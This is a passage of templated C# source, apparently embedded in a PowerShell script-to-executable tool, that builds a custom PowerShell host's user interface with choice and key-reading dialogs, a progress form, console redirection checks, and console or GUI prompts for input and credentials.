			// Diese Controls also jetzt fertigstellen
			int Counter = 0;
			int tempWidth = System.Windows.Forms.Screen.FromControl(form).Bounds.Width*5/8 - 18;
			foreach (ChoiceDescription sAuswahl in arrChoice)
			{
				aradioButton[Counter] = new RadioButton();
				aradioButton[Counter].Text = sAuswahl.Label;
				if (Counter == intDefault)
					aradioButton[Counter].Checked = true;
				aradioButton[Counter].Location = new Point(9, iPosY);
				aradioButton[Counter].AutoSize = true;
				// erst durch Add() wird die Größe des Labels ermittelt
				form.Controls.Add(aradioButton[Counter]);
				if (aradioButton[Counter].Width > tempWidth)
				{ // radio field to wide for screen -> make two lines
					int tempHeight = aradioButton[Counter].Height;
					aradioButton[Counter].Height = tempHeight*(1 + (aradioButton[Counter].Width-1)/tempWidth);
					aradioButton[Counter].Width = tempWidth;
					aradioButton[Counter].AutoSize = false;
				}
				iPosY = aradioButton[Counter].Bottom;
				if (aradioButton[Counter].Right > iMaxX) { iMaxX = aradioButton[Counter].Right; }
				if (!string.IsNullOrEmpty(sAuswahl.HelpMessage))
					 toolTip.SetToolTip(aradioButton[Counter], sAuswahl.HelpMessage);
				Counter++;
			}

			// Tooltip auch anzeigen, wenn Parent-Fenster inaktiv ist
			toolTip.ShowAlways = true;

			// Button erzeugen
			buttonOk.Text = "OK";
			buttonOk.DialogResult = DialogResult.OK;
			buttonOk.SetBounds(System.Math.Max(12, iMaxX - 77), iPosY + 36, 75, 23);

			// configure form
			if (string.IsNullOrEmpty(strTitle))
				form.Text = System.AppDomain.CurrentDomain.FriendlyName;
			else
				form.Text = strTitle;
			form.ClientSize = new System.Drawing.Size(System.Math.Max(178, iMaxX + 10), iPosY + 71);
			form.Controls.Add(buttonOk);
			form.FormBorderStyle = FormBorderStyle.FixedDialog;
			form.StartPosition = FormStartPosition.CenterScreen;
			try {
				form.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
			}
			catch
			{ }
			form.MinimizeBox = false;
			form.MaximizeBox = false;
			form.AcceptButton = buttonOk;

			// show and compute form
			if (form.ShowDialog() == DialogResult.OK)
			{ int iRueck = -1;
				for (Counter = 0; Counter < arrChoice.Count; Counter++)
				{
					if (aradioButton[Counter].Checked == true)
					{ iRueck = Counter; }
				}
				return iRueck;
			}
			else
				return -1;
		}
	}

	public class ReadKey_Box
	{
		[DllImport("user32.dll")]
		public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
			[Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff,
			int cchBuff, uint wFlags);

		static string GetCharFromKeys(Keys keys, bool blShift, bool blAltGr)
		{
			System.Text.StringBuilder buffer = new System.Text.StringBuilder(64);
			byte[] keyboardState = new byte[256];
			if (blShift)
			{ keyboardState[(int) Keys.ShiftKey] = 0xff; }
			if (blAltGr)
			{ keyboardState[(int) Keys.ControlKey] = 0xff;
				keyboardState[(int) Keys.Menu] = 0xff;
			}
			if (ToUnicode((uint) keys, 0, keyboardState, buffer, 64, 0) >= 1)
				return buffer.ToString();
			else
				return "\0";
		}

		class Keyboard_Form : Form
		{
			public Keyboard_Form()
			{
				this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
				this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
				this.KeyDown += new KeyEventHandler(Keyboard_Form_KeyDown);
				this.KeyUp += new KeyEventHandler(Keyboard_Form_KeyUp);
			}

			// check for KeyDown or KeyUp?
			public bool checkKeyDown = true;
			// key code for pressed key
			public KeyInfo keyinfo;

			void Keyboard_Form_KeyDown(object sender, KeyEventArgs e)
			{
				if (checkKeyDown)
				{ // store key info
					keyinfo.VirtualKeyCode = e.KeyValue;
					keyinfo.Character = GetCharFromKeys(e.KeyCode, e.Shift, e.Alt & e.Control)[0];
					keyinfo.KeyDown = false;
					keyinfo.ControlKeyState = 0;
					if (e.Alt) { keyinfo.ControlKeyState = ControlKeyStates.LeftAltPressed | ControlKeyStates.RightAltPressed; }
					if (e.Control)
					{ keyinfo.ControlKeyState |= ControlKeyStates.LeftCtrlPressed | ControlKeyStates.RightCtrlPressed;
						if (!e.Alt)
						{ if (e.KeyValue > 64 && e.KeyValue < 96) keyinfo.Character = (char)(e.KeyValue - 64); }
					}
					if (e.Shift) { keyinfo.ControlKeyState |= ControlKeyStates.ShiftPressed; }
					if ((e.Modifiers & System.Windows.Forms.Keys.CapsLock) > 0) { keyinfo.ControlKeyState |= ControlKeyStates.CapsLockOn; }
					if ((e.Modifiers & System.Windows.Forms.Keys.NumLock) > 0) { keyinfo.ControlKeyState |= ControlKeyStates.NumLockOn; }
					// and close the form
					this.Close();
				}
			}

			void Keyboard_Form_KeyUp(object sender, KeyEventArgs e)
			{
				if (!checkKeyDown)
				{ // store key info
					keyinfo.VirtualKeyCode = e.KeyValue;
					keyinfo.Character = GetCharFromKeys(e.KeyCode, e.Shift, e.Alt & e.Control)[0];
					keyinfo.KeyDown = true;
					keyinfo.ControlKeyState = 0;
					if (e.Alt) { keyinfo.ControlKeyState = ControlKeyStates.LeftAltPressed | ControlKeyStates.RightAltPressed; }
					if (e.Control)
					{ keyinfo.ControlKeyState |= ControlKeyStates.LeftCtrlPressed | ControlKeyStates.RightCtrlPressed;
						if (!e.Alt)
						{ if (e.KeyValue > 64 && e.KeyValue < 96) keyinfo.Character = (char)(e.KeyValue - 64); }
					}
					if (e.Shift) { keyinfo.ControlKeyState |= ControlKeyStates.ShiftPressed; }
					if ((e.Modifiers & System.Windows.Forms.Keys.CapsLock) > 0) { keyinfo.ControlKeyState |= ControlKeyStates.CapsLockOn; }
					if ((e.Modifiers & System.Windows.Forms.Keys.NumLock) > 0) { keyinfo.ControlKeyState |= ControlKeyStates.NumLockOn; }
					// and close the form
					this.Close();
				}
			}
		}

		public static KeyInfo Show(string strTitle, string strPrompt, bool blIncludeKeyDown)
		{
			// Controls erzeugen
			Keyboard_Form form = new Keyboard_Form();
			Label label = new Label();

			// Am Label orientieren sich die Größen und Positionen
			// Dieses Control also zuerst fertigstellen
			if (string.IsNullOrEmpty(strPrompt))
			{
					label.Text = "Press a key";
			}
			else
				label.Text = strPrompt;
			label.Location = new Point(9, 19);
			label.MaximumSize = new System.Drawing.Size(System.Windows.Forms.Screen.FromControl(form).Bounds.Width*5/8 - 18, 0);
			label.AutoSize = true;
			// erst durch Add() wird die Größe des Labels ermittelt
			form.Controls.Add(label);

			// configure form
			if (string.IsNullOrEmpty(strTitle))
				form.Text = System.AppDomain.CurrentDomain.FriendlyName;
			else
				form.Text = strTitle;
			form.ClientSize = new System.Drawing.Size(System.Math.Max(178, label.Right + 10), label.Bottom + 55);
			form.FormBorderStyle = FormBorderStyle.FixedDialog;
			form.StartPosition = FormStartPosition.CenterScreen;
			try {
				form.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
			}
			catch
			{ }
			form.MinimizeBox = false;
			form.MaximizeBox = false;

			// show and compute form
			form.checkKeyDown = blIncludeKeyDown;
			form.ShowDialog();
			return form.keyinfo;
		}
	}

	public class Progress_Form : Form
	{
		private ConsoleColor ProgressBarColor = ConsoleColor.DarkCyan;

$(if (!$noVisualStyles) {@"
		private System.Timers.Timer timer = new System.Timers.Timer();
		private int barNumber = -1;
		private int barValue = -1;
		private bool inTick = false;
"@ })

		struct Progress_Data
		{
			internal Label lbActivity;
			internal Label lbStatus;
			internal ProgressBar objProgressBar;
			internal Label lbRemainingTime;
			internal Label lbOperation;
			internal int ActivityId;
			internal int ParentActivityId;
			internal int Depth;
		};

		private List<Progress_Data> progressDataList = new List<Progress_Data>();

		private Color DrawingColor(ConsoleColor color)
		{  // convert ConsoleColor to System.Drawing.Color
			switch (color)
			{
				case ConsoleColor.Black: return Color.Black;
				case ConsoleColor.Blue: return Color.Blue;
				case ConsoleColor.Cyan: return Color.Cyan;
				case ConsoleColor.DarkBlue: return ColorTranslator.FromHtml("#000080");
				case ConsoleColor.DarkGray: return ColorTranslator.FromHtml("#808080");
				case ConsoleColor.DarkGreen: return ColorTranslator.FromHtml("#008000");
				case ConsoleColor.DarkCyan: return ColorTranslator.FromHtml("#008080");
				case ConsoleColor.DarkMagenta: return ColorTranslator.FromHtml("#800080");
				case ConsoleColor.DarkRed: return ColorTranslator.FromHtml("#800000");
				case ConsoleColor.DarkYellow: return ColorTranslator.FromHtml("#808000");
				case ConsoleColor.Gray: return ColorTranslator.FromHtml("#C0C0C0");
				case ConsoleColor.Green: return ColorTranslator.FromHtml("#00FF00");
				case ConsoleColor.Magenta: return Color.Magenta;
				case ConsoleColor.Red: return Color.Red;
				case ConsoleColor.White: return Color.White;
				default: return Color.Yellow;
			}
		}

		private void InitializeComponent()
		{
			this.SuspendLayout();

			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;

			this.AutoScroll = true;
			this.Text = System.AppDomain.CurrentDomain.FriendlyName;
			this.Height = 147;
			this.Width = 800;
			this.BackColor = Color.White;
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
			this.MinimizeBox = false;
			this.MaximizeBox = false;
			this.ControlBox = false;
			this.StartPosition = FormStartPosition.CenterScreen;

			this.ResumeLayout();
$(if (!$noVisualStyles) {@"
			timer.Elapsed += new System.Timers.ElapsedEventHandler(TimeTick);
			timer.Interval = 50; // milliseconds
			timer.AutoReset = true;
			timer.Start();
"@ })
		}
$(if (!$noVisualStyles) {@"
		private void TimeTick(object source, System.Timers.ElapsedEventArgs e)
		{ // worker function that is called by timer event

			if (inTick) return;
			inTick = true;
			if (barNumber >= 0)
			{
				if (barValue >= 0)
				{
					progressDataList[barNumber].objProgressBar.Value = barValue;
					barValue = -1;
				}
				progressDataList[barNumber].objProgressBar.Refresh();
			}
			inTick = false;
		}
"@ })

		private void AddBar(ref Progress_Data pd, int position)
		{
			// Create Label
			pd.lbActivity = new Label();
			pd.lbActivity.Left = 5;
			pd.lbActivity.Top = 104*position + 10;
			pd.lbActivity.Width = 800 - 20;
			pd.lbActivity.Height = 16;
			pd.lbActivity.Font = new Font(pd.lbActivity.Font, FontStyle.Bold);
			pd.lbActivity.Text = "";
			// Add Label to Form
			this.Controls.Add(pd.lbActivity);

			// Create Label
			pd.lbStatus = new Label();
			pd.lbStatus.Left = 25;
			pd.lbStatus.Top = 104*position + 26;
			pd.lbStatus.Width = 800 - 40;
			pd.lbStatus.Height = 16;
			pd.lbStatus.Text = "";
			// Add Label to Form
			this.Controls.Add(pd.lbStatus);

			// Create ProgressBar
			pd.objProgressBar = new ProgressBar();
			pd.objProgressBar.Value = 0;
$(if ($noVisualStyles) {@"
			pd.objProgressBar.Style = ProgressBarStyle.Continuous;
"@ } else {@"
			pd.objProgressBar.Style = ProgressBarStyle.Blocks;
"@ })
			pd.objProgressBar.ForeColor = DrawingColor(ProgressBarColor);
			if (pd.Depth < 15)
			{
				pd.objProgressBar.Size = new System.Drawing.Size(800 - 60 - 30*pd.Depth, 20);
				pd.objProgressBar.Left = 25 + 30*pd.Depth;
			}
			else
			{
				pd.objProgressBar.Size = new System.Drawing.Size(800 - 60 - 450, 20);
				pd.objProgressBar.Left = 25 + 450;
			}
			pd.objProgressBar.Top = 104*position + 47;
			// Add ProgressBar to Form
			this.Controls.Add(pd.objProgressBar);

			// Create Label
			pd.lbRemainingTime = new Label();
			pd.lbRemainingTime.Left = 5;
			pd.lbRemainingTime.Top = 104*position + 72;
			pd.lbRemainingTime.Width = 800 - 20;
			pd.lbRemainingTime.Height = 16;
			pd.lbRemainingTime.Text = "";
			// Add Label to Form
			this.Controls.Add(pd.lbRemainingTime);

			// Create Label
			pd.lbOperation = new Label();
			pd.lbOperation.Left = 25;
			pd.lbOperation.Top = 104*position + 88;
			pd.lbOperation.Width = 800 - 40;
			pd.lbOperation.Height = 16;
			pd.lbOperation.Text = "";
			// Add Label to Form
			this.Controls.Add(pd.lbOperation);
		}

		public int GetCount()
		{
			return progressDataList.Count;
		}

		public Progress_Form()
		{
			InitializeComponent();
		}

		public Progress_Form(ConsoleColor BarColor)
		{
			ProgressBarColor = BarColor;
			InitializeComponent();
		}

		public void Update(ProgressRecord objRecord)
		{
			if (objRecord == null)
				return;

			int currentProgress = -1;
			for (int i = 0; i < progressDataList.Count; i++)
			{
				if (progressDataList[i].ActivityId == objRecord.ActivityId)
				{ currentProgress = i;
					break;
				}
			}

			if (objRecord.RecordType == ProgressRecordType.Completed)
			{
				if (currentProgress >= 0)
				{
$(if (!$noVisualStyles) {@"
					if (barNumber == currentProgress) barNumber = -1;
"@ })
					this.Controls.Remove(progressDataList[currentProgress].lbActivity);
					this.Controls.Remove(progressDataList[currentProgress].lbStatus);
					this.Controls.Remove(progressDataList[currentProgress].objProgressBar);
					this.Controls.Remove(progressDataList[currentProgress].lbRemainingTime);
					this.Controls.Remove(progressDataList[currentProgress].lbOperation);

					progressDataList[currentProgress].lbActivity.Dispose();
					progressDataList[currentProgress].lbStatus.Dispose();
					progressDataList[currentProgress].objProgressBar.Dispose();
					progressDataList[currentProgress].lbRemainingTime.Dispose();
					progressDataList[currentProgress].lbOperation.Dispose();

					progressDataList.RemoveAt(currentProgress);
				}

				if (progressDataList.Count == 0)
				{
$(if (!$noVisualStyles) {@"
					timer.Stop();
					timer.Dispose();
"@ })
					this.Close();
					return;
				}

				if (currentProgress < 0) return;

				for (int i = currentProgress; i < progressDataList.Count; i++)
				{
					progressDataList[i].lbActivity.Top = 104*i + 10;
					progressDataList[i].lbStatus.Top = 104*i + 26;
					progressDataList[i].objProgressBar.Top = 104*i + 47;
					progressDataList[i].lbRemainingTime.Top = 104*i + 72;
					progressDataList[i].lbOperation.Top = 104*i + 88;
				}

				if (104*progressDataList.Count + 43 <= System.Windows.Forms.Screen.FromControl(this).Bounds.Height)
				{
					this.Height = 104*progressDataList.Count + 43;
					this.Location = new Point((System.Windows.Forms.Screen.FromControl(this).Bounds.Width - this.Width)/2, (System.Windows.Forms.Screen.FromControl(this).Bounds.Height - this.Height)/2);
				}
				else
				{
					this.Height = System.Windows.Forms.Screen.FromControl(this).Bounds.Height;
					this.Location = new Point((System.Windows.Forms.Screen.FromControl(this).Bounds.Width - this.Width)/2, 0);
				}

				return;
			}

			if (currentProgress < 0)
			{
				Progress_Data pd = new Progress_Data();
				pd.ActivityId = objRecord.ActivityId;
				pd.ParentActivityId = objRecord.ParentActivityId;
				pd.Depth = 0;

				int nextid = -1;
				int parentid = -1;
				if (pd.ParentActivityId >= 0)
				{
					for (int i = 0; i < progressDataList.Count; i++)
					{
						if (progressDataList[i].ActivityId == pd.ParentActivityId)
						{ parentid = i;
							break;
						}
					}
				}

				if (parentid >= 0)
				{
					pd.Depth = progressDataList[parentid].Depth + 1;

					for (int i = parentid + 1; i < progressDataList.Count; i++)
					{
						if ((progressDataList[i].Depth < pd.Depth) || ((progressDataList[i].Depth == pd.Depth) && (progressDataList[i].ParentActivityId != pd.ParentActivityId)))
						{ nextid = i;
							break;
						}
					}
				}

				if (nextid == -1)
				{
					AddBar(ref pd, progressDataList.Count);
					currentProgress = progressDataList.Count;
					progressDataList.Add(pd);
				}
				else
				{
					AddBar(ref pd, nextid);
					currentProgress = nextid;
					progressDataList.Insert(nextid, pd);

					for (int i = currentProgress+1; i < progressDataList.Count; i++)
					{
						progressDataList[i].lbActivity.Top = 104*i + 10;
						progressDataList[i].lbStatus.Top = 104*i + 26;
						progressDataList[i].objProgressBar.Top = 104*i + 47;
						progressDataList[i].lbRemainingTime.Top = 104*i + 72;
						progressDataList[i].lbOperation.Top = 104*i + 88;
					}
				}
				if (104*progressDataList.Count + 43 <= System.Windows.Forms.Screen.FromControl(this).Bounds.Height)
				{
					this.Height = 104*progressDataList.Count + 43;
					this.Location = new Point((System.Windows.Forms.Screen.FromControl(this).Bounds.Width - this.Width)/2, (System.Windows.Forms.Screen.FromControl(this).Bounds.Height - this.Height)/2);
				}
				else
				{
					this.Height = System.Windows.Forms.Screen.FromControl(this).Bounds.Height;
					this.Location = new Point((System.Windows.Forms.Screen.FromControl(this).Bounds.Width - this.Width)/2, 0);
				}
			}

			if (!string.IsNullOrEmpty(objRecord.Activity))
				progressDataList[currentProgress].lbActivity.Text = objRecord.Activity;
			else
				progressDataList[currentProgress].lbActivity.Text = "";

			if (!string.IsNullOrEmpty(objRecord.StatusDescription))
				progressDataList[currentProgress].lbStatus.Text = objRecord.StatusDescription;
			else
				progressDataList[currentProgress].lbStatus.Text = "";

			if ((objRecord.PercentComplete >= 0) && (objRecord.PercentComplete <= 100))
			{
$(if (!$noVisualStyles) {@"
				if (objRecord.PercentComplete < 100)
					progressDataList[currentProgress].objProgressBar.Value = objRecord.PercentComplete + 1;
				else
					progressDataList[currentProgress].objProgressBar.Value = 99;
				progressDataList[currentProgress].objProgressBar.Visible = true;
				barNumber = currentProgress;
				barValue = objRecord.PercentComplete;
"@ } else {@"
				progressDataList[currentProgress].objProgressBar.Value = objRecord.PercentComplete;
				progressDataList[currentProgress].objProgressBar.Visible = true;
"@ })
			}
			else
			{ if (objRecord.PercentComplete > 100)
				{
					progressDataList[currentProgress].objProgressBar.Value = 0;
					progressDataList[currentProgress].objProgressBar.Visible = true;
$(if (!$noVisualStyles) {@"
					barNumber = currentProgress;
					barValue = 0;
"@ })
				}
				else
				{
					progressDataList[currentProgress].objProgressBar.Visible = false;
$(if (!$noVisualStyles) {@"
					if (barNumber == currentProgress) barNumber = -1;
"@ })
				}
			}

			if (objRecord.SecondsRemaining >= 0)
			{
				System.TimeSpan objTimeSpan = new System.TimeSpan(0, 0, objRecord.SecondsRemaining);
				progressDataList[currentProgress].lbRemainingTime.Text = "Remaining time: " + string.Format("{0:00}:{1:00}:{2:00}", (int)objTimeSpan.TotalHours, objTimeSpan.Minutes, objTimeSpan.Seconds);
			}
			else
				progressDataList[currentProgress].lbRemainingTime.Text = "";

			if (!string.IsNullOrEmpty(objRecord.CurrentOperation))
				progressDataList[currentProgress].lbOperation.Text = objRecord.CurrentOperation;
			else
				progressDataList[currentProgress].lbOperation.Text = "";

			Application.DoEvents();
		}
	}
"@})

	// define IsInputRedirected(), IsOutputRedirected() and IsErrorRedirected() here since they were introduced first with .Net 4.5
	public class Console_Info
	{
		private enum FileType : uint
		{
			FILE_TYPE_UNKNOWN = 0x0000,
			FILE_TYPE_DISK = 0x0001,
			FILE_TYPE_CHAR = 0x0002,
			FILE_TYPE_PIPE = 0x0003,
			FILE_TYPE_REMOTE = 0x8000
		}

		private enum STDHandle : uint
		{
			STD_INPUT_HANDLE = unchecked((uint)-10),
			STD_OUTPUT_HANDLE = unchecked((uint)-11),
			STD_ERROR_HANDLE = unchecked((uint)-12)
		}

		[DllImport("Kernel32.dll")]
		static private extern UIntPtr GetStdHandle(STDHandle stdHandle);

		[DllImport("Kernel32.dll")]
		static private extern FileType GetFileType(UIntPtr hFile);

		static public bool IsInputRedirected()
		{
			UIntPtr hInput = GetStdHandle(STDHandle.STD_INPUT_HANDLE);
			FileType fileType = (FileType)GetFileType(hInput);
			if ((fileType == FileType.FILE_TYPE_CHAR) || (fileType == FileType.FILE_TYPE_UNKNOWN))
				return false;
			return true;
		}

		static public bool IsOutputRedirected()
		{
			UIntPtr hOutput = GetStdHandle(STDHandle.STD_OUTPUT_HANDLE);
			FileType fileType = (FileType)GetFileType(hOutput);
			if ((fileType == FileType.FILE_TYPE_CHAR) || (fileType == FileType.FILE_TYPE_UNKNOWN))
				return false;
			return true;
		}

		static public bool IsErrorRedirected()
		{
			UIntPtr hError = GetStdHandle(STDHandle.STD_ERROR_HANDLE);
			FileType fileType = (FileType)GetFileType(hError);
			if ((fileType == FileType.FILE_TYPE_CHAR) || (fileType == FileType.FILE_TYPE_UNKNOWN))
				return false;
			return true;
		}
	}


	internal class MainModuleUI : PSHostUserInterface
	{
		private MainModuleRawUI rawUI = null;

		public ConsoleColor ErrorForegroundColor = ConsoleColor.Red;
		public ConsoleColor ErrorBackgroundColor = ConsoleColor.Black;

		public ConsoleColor WarningForegroundColor = ConsoleColor.Yellow;
		public ConsoleColor WarningBackgroundColor = ConsoleColor.Black;

		public ConsoleColor DebugForegroundColor = ConsoleColor.Yellow;
		public ConsoleColor DebugBackgroundColor = ConsoleColor.Black;

		public ConsoleColor VerboseForegroundColor = ConsoleColor.Yellow;
		public ConsoleColor VerboseBackgroundColor = ConsoleColor.Black;

$(if (!$noConsole) {@"
		public ConsoleColor ProgressForegroundColor = ConsoleColor.Yellow;
"@ } else {@"
		public ConsoleColor ProgressForegroundColor = ConsoleColor.DarkCyan;
"@ })
		public ConsoleColor ProgressBackgroundColor = ConsoleColor.DarkCyan;

		public MainModuleUI() : base()
		{
			rawUI = new MainModuleRawUI();
$(if (!$noConsole) {@"
			rawUI.ForegroundColor = Console.ForegroundColor;
			rawUI.BackgroundColor = Console.BackgroundColor;
"@ })
		}

		public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
		{
$(if (!$noConsole) {@"
			if (!string.IsNullOrEmpty(caption)) WriteLine(caption);
			if (!string.IsNullOrEmpty(message)) WriteLine(message);
"@ } else {@"
			if ((!string.IsNullOrEmpty(caption)) || (!string.IsNullOrEmpty(message)))
			{ string sTitel = System.AppDomain.CurrentDomain.FriendlyName, sMeldung = "";

				if (!string.IsNullOrEmpty(caption)) sTitel = caption;
				if (!string.IsNullOrEmpty(message)) sMeldung = message;
				MessageBox.Show(sMeldung, sTitel);
			}

			// Titel und Labeltext für Input_Box zurücksetzen
			ib_caption = "";
			ib_message = "";
"@ })
			Dictionary<string, PSObject> ret = new Dictionary<string, PSObject>();
			foreach (FieldDescription cd in descriptions)
			{
				Type t = null;
				if (string.IsNullOrEmpty(cd.ParameterAssemblyFullName))
					t = typeof(string);
				else
					t = Type.GetType(cd.ParameterAssemblyFullName);

				if (t.IsArray)
				{
					Type elementType = t.GetElementType();
					Type genericListType = Type.GetType("System.Collections.Generic.List"+((char)0x60).ToString()+"1");
					genericListType = genericListType.MakeGenericType(new Type[] { elementType });
					ConstructorInfo constructor = genericListType.GetConstructor(BindingFlags.CreateInstance | BindingFlags.Instance | BindingFlags.Public, null, Type.EmptyTypes, null);
					object resultList = constructor.Invoke(null);

					int index = 0;
					string data = "";
					do
					{
						try
						{
$(if (!$noConsole) {@"
							if (!string.IsNullOrEmpty(cd.Name)) Write(string.Format("{0}[{1}]: ", cd.Name, index));
"@ } else {@"
							if (!string.IsNullOrEmpty(cd.Name)) ib_message = string.Format("{0}[{1}]: ", cd.Name, index);
"@ })
							data = ReadLine();
							if (string.IsNullOrEmpty(data))
								break;

							object o = System.Convert.ChangeType(data, elementType);
							genericListType.InvokeMember("Add", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, resultList, new object[] { o });
						}
						catch (Exception e)
						{
							throw e;
						}
						index++;
					} while (true);

					System.Array retArray = (System.Array )genericListType.InvokeMember("ToArray", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, resultList, null);
					ret.Add(cd.Name, new PSObject(retArray));
				}
				else
				{
					object o = null;
					string l = null;
					try
					{
						if (t != typeof(System.Security.SecureString))
						{
							if (t != typeof(System.Management.Automation.PSCredential))
							{
$(if (!$noConsole) {@"
								if (!string.IsNullOrEmpty(cd.Name)) Write(cd.Name);
								if (!string.IsNullOrEmpty(cd.HelpMessage)) Write(" (Type !? for help.)");
								if ((!string.IsNullOrEmpty(cd.Name)) || (!string.IsNullOrEmpty(cd.HelpMessage))) Write(": ");
"@ } else {@"
								if (!string.IsNullOrEmpty(cd.Name)) ib_message = string.Format("{0}: ", cd.Name);
								if (!string.IsNullOrEmpty(cd.HelpMessage)) ib_message += "\n(Type !? for help.)";
"@ })
								do {
									l = ReadLine();
									if (l == "!?")
										WriteLine(cd.HelpMessage);
									else
									{
										if (string.IsNullOrEmpty(l)) o = cd.DefaultValue;
										if (o == null)
										{
											try {
												o = System.Convert.ChangeType(l, t);
											}
											catch {
												Write("Wrong format, please repeat input: ");
												l = "!?";
											}
										}
									}
								} while (l == "!?");
							}
							else
							{
								PSCredential pscred = PromptForCredential("", "", "", "");
								o = pscred;
							}
						}
						else
						{
$(if (!$noConsole) {@"
								if (!string.IsNullOrEmpty(cd.Name)) Write(string.Format("{0}: ", cd.Name));
"@ } else {@"
								if (!string.IsNullOrEmpty(cd.Name)) ib_message = string.Format("{0}: ", cd.Name);
"@ })

							SecureString pwd = null;
							pwd = ReadLineAsSecureString();
							o = pwd;
						}

						ret.Add(cd.Name, new PSObject(o));
					}
					catch (Exception e)
					{
						throw e;
					}
				}
			}
$(if ($noConsole) {@"
			// Titel und Labeltext für Input_Box zurücksetzen
			ib_caption = "";
			ib_message = "";
"@ })
			return ret;
		}

		public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
		{
$(if ($noConsole) {@"
			int iReturn = Choice_Box.Show(choices, defaultChoice, caption, message);
			if (iReturn == -1) { iReturn = defaultChoice; }
			return iReturn;
"@ } else {@"
			if (!string.IsNullOrEmpty(caption)) WriteLine(caption);
			WriteLine(message);
			do {
				int idx = 0;
				SortedList<string, int> res = new SortedList<string, int>();
				string defkey = "";
				foreach (ChoiceDescription cd in choices)
				{
					string lkey = cd.Label.Substring(0, 1), ltext = cd.Label;
					int pos = cd.Label.IndexOf('&');
					if (pos > -1)
					{
						lkey = cd.Label.Substring(pos + 1, 1).ToUpper();
						if (pos > 0)
							ltext = cd.Label.Substring(0, pos) + cd.Label.Substring(pos + 1);
						else
							ltext = cd.Label.Substring(1);
					}
					res.Add(lkey.ToLower(), idx);

					if (idx > 0) Write("  ");
					if (idx == defaultChoice)
					{
						Write(VerboseForegroundColor, rawUI.BackgroundColor, string.Format("[{0}] {1}", lkey, ltext));
						defkey = lkey;
					}
					else
						Write(rawUI.ForegroundColor, rawUI.BackgroundColor, string.Format("[{0}] {1}", lkey, ltext));
					idx++;
				}
				Write(rawUI.ForegroundColor, rawUI.BackgroundColor, string.Format("  [?] Help (default is \"{0}\"): ", defkey));

				string inpkey = "";
				try
				{
					inpkey = Console.ReadLine().ToLower();
					if (res.ContainsKey(inpkey)) return res[inpkey];
					if (string.IsNullOrEmpty(inpkey)) return defaultChoice;
				}
				catch { }
				if (inpkey == "?")
				{
					foreach (ChoiceDescription cd in choices)
					{
						string lkey = cd.Label.Substring(0, 1);
						int pos = cd.Label.IndexOf('&');
						if (pos > -1) lkey = cd.Label.Substring(pos + 1, 1).ToUpper();
						if (!string.IsNullOrEmpty(cd.HelpMessage))
							WriteLine(rawUI.ForegroundColor, rawUI.BackgroundColor, string.Format("{0} - {1}", lkey, cd.HelpMessage));
						else
							WriteLine(rawUI.ForegroundColor, rawUI.BackgroundColor, string.Format("{0} -", lkey));
					}
				}
			} while (true);
"@ })
		}

		public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
		{
$(if (!$noConsole -and !$credentialGUI) {@"
			if (!string.IsNullOrEmpty(caption)) WriteLine(caption);
			WriteLine(message);

			string un;
			if ((string.IsNullOrEmpty(userName)) || ((options & PSCredentialUIOptions.ReadOnlyUserName) == 0))
			{
				Write("User name: ");
				un = ReadLine();
			}
			else
			{
				Write("User name: ");
				if (!string.IsNullOrEmpty(targetName)) Write(targetName + "\\");
				WriteLine(userName);
				un = userName;
			}
			SecureString pwd = null;
			Write("Password: ");
			pwd = ReadLineAsSecureString();

			if (string.IsNullOrEmpty(un)) un = "<NOUSER>";
			if (!string.IsNullOrEmpty(targetName))
			{
				if (un.IndexOf('\\') < 0)
					un = targetName + "\\" + un;
			}

			PSCredential c2 = new PSCredential(un, pwd);
			return c2;
"@ } else {@"
			Credential_Form.User_Pwd cred = Credential_Form.PromptForPassword(caption, message, targetName, userName, allowedCredentialTypes, options);
			if (cred != null)
			{
				System.Security.SecureString x = new System.Security.SecureString();
				foreach (char c in cred.Password.ToCharArray())
					x.AppendChar(c);

				return new PSCredential(cred.User, x);
			}
			return null;
"@ })
		}

		public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
		{
$(if (!$noConsole -and !$credentialGUI) {@"
			if (!string.IsNullOrEmpty(caption)) WriteLine(caption);
			WriteLine(message);

			string un;
			if (string.IsNullOrEmpty(userName))
			{
				Write("User name: ");
				un = ReadLine();
			}
			else
			{
				Write("User name: ");
				if (!string.IsNullOrEmpty(targetName)) Write(targetName + "\\");
				WriteLine(userName);
				un = userName;
			}
			SecureString pwd = null;
			Write("Password: ");
			pwd = ReadLineAsSecureString();

			if (string.IsNullOrEmpty(un)) un = "<NOUSER>";
			if (!string.IsNullOrEmpty(targetName))
			{
				if (un.IndexOf('\\') < 0)
					un = targetName + "\\" + un;
			}

			PSCredential c2 = new PSCredential(un, pwd);
			return c2;
"@ } else {@"
			Credential_Form.User_Pwd cred = Credential_Form.PromptForPassword(caption, message, targetName, userName, PSCredentialTypes.Default, PSCredentialUIOptions.Default);
			if (cred != null)
			{
				System.Security.SecureString x = new System.Security.SecureString();
				foreach (char c in cred.Password.ToCharArray())
					x.AppendChar(c);

				return new PSCredential(cred.User, x);
			}
			return null;
"@ })
		}

		public override PSHostRawUserInterface RawUI
		{
			get
			{
				return rawUI;
			}
		}

$(if ($noConsole) {@"
		private string ib_caption;
		private string ib_message;
"@ })

		public override string ReadLine()
		{
$(if (!$noConsole) {@"
			return Console.ReadLine();
"@ } else {@"
			string sWert = "";
			if (Input_Box.Show(ib_caption, ib_message, ref sWert) == DialogResult.OK)
				return sWert;
			else
"@ })
$(if ($noConsole) { if ($exitOnCancel) {@"
				Environment.Exit(1);
			return "";
"@ } else {@"
				return "";
